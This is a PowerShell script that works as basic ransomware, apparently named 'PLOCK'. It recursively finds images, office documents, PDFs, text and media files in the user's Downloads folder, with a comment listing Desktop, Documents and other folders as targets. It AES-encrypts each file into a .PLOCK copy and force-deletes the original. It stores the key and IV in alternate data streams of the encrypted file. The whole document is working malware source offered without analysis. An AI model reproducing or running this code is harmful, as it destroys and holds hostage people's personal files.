Function Get-AllFiles([System.Array] $Folders, [System.Array] $Extensions)
{
    $Files = @()
    Foreach($Folder in $Folders)
    {
        $Files += Get-ChildItem -Recurse -Path "$env:USERPROFILE\$Folder" -Include $Extensions -Force -ErrorAction Ignore | Select-Object -Property Name, DirectoryName
    }
    return $Files
}

Function Set-Cryptor()
{
    $Cryptor = New-Object System.Security.Cryptography.AesManaged
    $Cryptor.GenerateIV()
    $Cryptor.GenerateKey()
    Return $Cryptor
}

Function Encrypt([System.Security.Cryptography.AesManaged] $Cryptor, [System.String] $OldFilePath, [System.String] $NewFilePath)
{
    $StreamReader = New-Object System.IO.BinaryReader([System.IO.File]::Open($OldFilePath,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read),[System.Text.Encoding]::Unicode)

    $Length = $StreamReader.BaseStream.Length

    $In = $StreamReader.ReadBytes($Length)
    $StreamReader.Close()

    $Encryptor = $Cryptor.CreateEncryptor()
    $Out = $Encryptor.TransformFinalBlock($In,0,$Length)

    $StreamWriter = New-Object System.IO.BinaryWriter([System.IO.File]::Create($NewFilePath),[System.Text.Encoding]::Unicode)
    $StreamWriter.Write($Out,0,$Out.Length)
    $StreamWriter.Close()
}

Function Export-Data([System.String] $NewFilePath, [System.Array] $Key, [System.Array] $IV, [System.String] $OldFilePath)
{
    Set-Content -Path $NewFilePath -Stream "PLOCK.Key" -Value $Key -Encoding Byte -Force
    Set-Content -Path $NewFilePath -Stream "PLOCK.IV" -Value $IV -Encoding Byte -Force
    Set-Content -Path $NewFilePath -Stream "PLOCK.FilePath" -Value $OldFilePath -Force
}

#"Desktop","Documents","Pictures","Videos","Music","Downloads"

$Folders = @("Downloads")
$Extensions = @("*.png","*.jpg","*.gif","*.bmp","*.odt","*.ods","*.odg","*.doc","*.docm","*.docx","*.pptx","*.pptm","*.xlsx","*.xlsm","*.csv","*.txt","*.pdf","*.xml","*.html","*.mp3","*.mp4")
$Files = Get-AllFiles $Folders $Extensions

$Files | % {
    $OldFilePath = $_.DirectoryName+"\"+$_.Name
    $NewFilePath = $_.DirectoryName+"\"+$_.Name -replace "\..*$",".PLOCK"

    $Cryptor = Set-Cryptor
    $Key = $Cryptor.Key
    $IV = $Cryptor.IV

    Encrypt $Cryptor $OldFilePath $NewFilePath
    Export-Data $NewFilePath $Key $IV $OldFilePath
    Remove-Item -Path $OldFilePath -Force
}